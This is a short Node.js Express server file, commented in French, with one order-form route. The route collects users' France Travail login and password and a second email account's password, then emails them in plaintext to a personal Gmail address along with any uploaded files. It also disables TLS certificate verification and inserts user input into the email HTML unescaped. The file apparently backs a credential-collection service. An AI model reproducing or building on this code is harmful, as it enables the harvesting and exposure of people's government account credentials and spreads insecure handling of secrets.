import express from 'express';
import nodemailer from 'nodemailer';
import multer from 'multer';
import cors from 'cors';

const app = express();
app.use(cors({
  origin: 'https://nexus-ob.onrender.com'
}));
app.use(express.json());

const upload = multer({ storage: multer.memoryStorage() });

// À remplacer dans votre fichier serveur (ex: server.js)
app.post('/api/send-order', upload.any(), async (req, res) => {
  try {
    // Récupération des VRAIS champs envoyés par le formulaire React
    const { 
      pack, 
      identifiantFT, 
      passwordFT, 
      emailDedicace, 
      passwordDedicace, 
      methodePaiement 
    } = req.body;
    
    const files = req.files || [];

    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: false, 
      auth: {
        user: process.env.EMAIL_USER, 
        pass: process.env.EMAIL_PASS, 
      },
      tls: {
        rejectUnauthorized: false 
      }
    });

    const attachments = files.map(file => ({
      filename: file.originalname,
      content: file.buffer
    }));

    await transporter.sendMail({
      from: '"NEXUS System" <andregomis3954@gmail.com>',
      to: 'andregomis3954@gmail.com',
      subject: `🚀 DOSSIER RÉCEPTIONNÉ : ${pack}`,
      html: `
        <div style="font-family: sans-serif; line-height: 1.6; color: #333; padding: 20px; border: 2px solid #059669; border-radius: 15px;">
          <h2 style="color: #059669;">Nouveau Dossier Reçu - NEXUS</h2>
          <p><strong>Offre sélectionnée :</strong> ${pack}</p>
          <p><strong>Méthode de Paiement indiqué :</strong> ${methodePaiement}</p>
          
          <div style="background: #f4f4f4; padding: 15px; border-radius: 10px; margin: 20px 0;">
            <h3 style="margin-top: 0; color: #0284c7;">🔑 Accès France Travail</h3>
            <p><strong>Identifiant :</strong> ${identifiantFT || 'Non fourni'}</p>
            <p><strong>Mot de passe :</strong> ${passwordFT || 'Non fourni'}</p>
          </div>

          <div style="background: #f4f4f4; padding: 15px; border-radius: 10px; margin: 20px 0;">
            <h3 style="margin-top: 0; color: #059669;">📧 Espace Candidat Dédié</h3>
            <p><strong>Email :</strong> ${emailDedicace || 'Non fourni'}</p>
            <p><strong>Mot de passe :</strong> ${passwordDedicace || 'Non fourni'}</p>
          </div>

          <p style="font-size: 12px; color: #666;">Fichiers joints reçus : ${attachments.length}</p>
        </div>
      `,
      attachments
    });

    console.log("✅ Mail envoyé avec succès !");
    return res.status(200).json({ success: true, message: "Dossier transmis !" });

  } catch (error) {
    console.error("❌ Erreur serveur au moment de l'envoi :", error);
    // Retourner l'erreur précise au format JSON pour aider le frontend à comprendre
    return res.status(500).json({ 
      success: false, 
      message: error.message || "Erreur lors de la configuration du protocole SMTP / Mail." 
    });
  }
});